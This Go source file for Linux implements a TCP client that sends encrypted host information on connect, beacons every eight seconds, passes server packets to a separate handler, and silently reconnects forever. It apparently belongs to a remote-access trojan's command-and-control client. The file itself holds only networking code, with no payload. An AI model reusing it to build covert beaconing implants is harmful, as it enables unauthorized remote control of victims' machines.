//go:build linux

package Protocol

import (
	"encoding/binary"
	"main/Encrypt"
	HandlePacket "main/HandlePacket/linux"
	"main/PcInfo"
	"math/rand"
	"net"
	"time"
)

func (s *Client) TcpSend(msg []byte, conn net.Conn) {
	defer func() {
		if err := recover(); err != nil {
			//log.Println("Send error:", err)
		}
	}()

	if conn == nil {
		//log.Println("Connection not established")
		return
	}
	msg, err := Encrypt.Encrypt(msg)
	if err != nil {
		return
	}
	bufferSize := int32(len(msg))
	err = binary.Write(conn, binary.LittleEndian, bufferSize)
	if err != nil {
		//log.Println("Failed to send buffer size:", err)
		return
	}

	const chunkSize = 50 * 1024 // 50 KB
	var chunk []byte

	for bytesSent := 0; bytesSent < len(msg); {
		if len(msg)-bytesSent > chunkSize {
			chunk = msg[bytesSent : bytesSent+chunkSize]
		} else {
			chunk = msg[bytesSent:]
		}

		_, err := conn.Write(chunk)
		if err != nil {
			//log.Println("Failed to send data:", err)
			return
		}

		bytesSent += len(chunk)
	}
}

// assuming for the sake of example

func (s *Client) InitializeTcpClient() {
	addr, err := net.ResolveTCPAddr("tcp", PcInfo.HostPort)
	if err != nil {
		s.IsConnected = false
		return
	}

	conn, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		s.IsConnected = false
		return
	}

	s.Client = conn
	if s.Client != nil {
		s.IsConnected = true
		s.Buffer = make([]byte, 4)
		s.MS.Reset()

		// Assuming SendInfo() exists
		s.TcpSend(SendInfo(), s.Client)
		// Implementing Timer using time package. Assuming KeepAlivePacket function exists
		s.keepAlive = time.NewTicker(8 * time.Second)

		// Start a goroutine to handle the ticks
		go func() {
			for range s.keepAlive.C {
				KeepAlivePacket(s.Client, func(data []byte, conn *net.TCPConn) {
					s.TcpSend(data, conn)
				})
			}
		}()

		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}

func (s *Client) ReadServerData() {
	if s.Client == nil || !s.IsConnected {
		s.IsConnected = false
		return
	}

	n, err := s.Client.Read(s.Buffer)
	if err != nil {
		s.IsConnected = false
		return
	}

	if n == 4 {
		s.MS.Write(s.Buffer)
		s.BufferSize = int64(binary.LittleEndian.Uint32(s.MS.Bytes()))
		s.MS.Reset()
		if s.BufferSize > 0 {
			s.Buffer = make([]byte, s.BufferSize)
			for int64(s.MS.Len()) != s.BufferSize {
				rc, err := s.Client.Read(s.Buffer)
				if err != nil {
					s.IsConnected = false
					return
				}
				s.MS.Write(s.Buffer[:rc])
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
			if int64(s.MS.Len()) == s.BufferSize {
				//fmt.Println("calc")
				HandlePacket.Read(s.MS.Bytes(), s.Client, func(data []byte, conn *net.TCPConn) {
					s.TcpSend(data, conn)
				})
				s.Buffer = make([]byte, 4)
				s.MS.Reset()
			} else {
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
		}
		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}

func (s *Client) Reconnect() {
	s.CloseConnection()
	s.InitializeTcpClient()
}

func (s *Client) CloseConnection() {
	if s.Client != nil {
		s.Client.Close()
	}
	s.MS.Reset()
}

func TcpRun() {
	socket := Client{}
	socket.InitializeTcpClient()

	r := rand.New(rand.NewSource(time.Now().UnixNano())) // Create a new random generator

	for {
		if !socket.IsConnected {
			socket.Reconnect()
		}
		time.Sleep(time.Duration(r.Intn(5000)) * time.Millisecond)
	}
}
